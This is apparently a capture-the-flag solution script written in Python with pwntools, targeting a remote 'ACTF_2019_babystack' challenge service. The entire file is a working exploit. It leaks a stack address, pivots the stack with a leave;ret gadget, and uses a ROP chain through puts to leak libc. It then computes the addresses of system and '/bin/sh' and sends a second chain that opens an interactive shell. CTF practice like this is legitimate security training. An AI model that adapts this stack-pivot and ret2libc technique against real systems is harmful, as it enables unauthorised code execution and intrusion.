from pwn import *


# p = process("./ACTF_2019_babystack")
p = remote("node4.buuoj.cn", 26236)

# context.log_level = "debug"

# stack pivot

leave_ret = 0x0400A18

# leak stack
p.sendlineafter(">", str(0xe0))
p.recvuntil("Your message will be saved at ")
info = int(p.recvuntil("\n", drop=True), 16)
print(hex(info), type(info))

# count
pro = ELF("./ACTF_2019_babystack")
puts_p = pro.plt["puts"]
puts_g = pro.got["puts"]
start = 0x0400800
pop_rdi_ret = 0x0400ad3 

# leak libc
pad = cyclic(0x8)+p64(pop_rdi_ret)+p64(puts_g)+p64(puts_p)+p64(start)
pad = pad.ljust(0xd0, b"\x00")
pad += p64(info)+p64(leave_ret)
p.sendafter(">", pad)

info = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF("/home/fanxinli/libc-so/libc-2.27-64.so")
base = info-libc.sym["puts"]
print("base: ", hex(base))
system = base+libc.sym["system"]
binsh = base+next(libc.search(b"/bin/sh\x00"))

# attack
p.sendlineafter(">", str(0xe0))
p.recvuntil("Your message will be saved at ")
info = int(p.recvuntil("\n", drop=True), 16)
print(hex(info), type(info))

ret = pop_rdi_ret+1  # avoid movaps
pad = cyclic(0x8)+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)
pad = pad.ljust(0xd0, b"\x00")
pad += p64(info)+p64(leave_ret)
p.sendafter(">", pad)

p.interactive()


